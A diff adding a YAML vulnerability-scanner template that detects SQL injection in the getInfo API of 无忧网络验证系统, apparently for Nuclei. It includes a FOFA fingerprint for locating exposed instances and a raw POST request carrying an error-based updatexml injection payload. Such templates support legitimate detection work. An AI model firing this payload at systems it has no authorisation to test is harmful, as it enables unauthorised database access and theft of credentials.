@@ -1,0 +1,35 @@
+id: wuyou-getInfo-sql
+
+info:
+  name: "无忧网络验证系统 getInfo 接口存在SQL注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="zhuya/js/base.js"
+    无忧网络验证系统在 /index.php/api/Software/getInfo 接口实现中存在可利用的SQL注入缺陷。攻击者可通过构造恶意输入参数绕过输入验证机制，向数据库提交精心设计的注入语句，实现对数据库的未授权访问。该漏洞允许远程攻击者执行任意SQL查询，导致敏感数据泄露（如管理员凭证及用户个人信息）。在具备高权限的情况下，攻击者可能进一步利用该漏洞在服务器上写入恶意代码，从而实现对服务器的完全控制。
+  reference:
+  - https://mp.weixin.qq.com/s/NRu5f8fPlpMpVxfliiOSIw
+  tags: 无忧网络验证系统
+
+http:
+- raw:
+  - |
+    POST /index.php/api/Software/getInfo HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9
+    Connection: close
+    Content-Type: application/x-www-form-urlencoded
+
+    data=1&id=1 and updatexml(1,concat(0x7e,md5(123123),0x7e),1)
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - '~4297f44b13955235245b2497399d7a9'
+  - type: status
+    status:
+    - 200
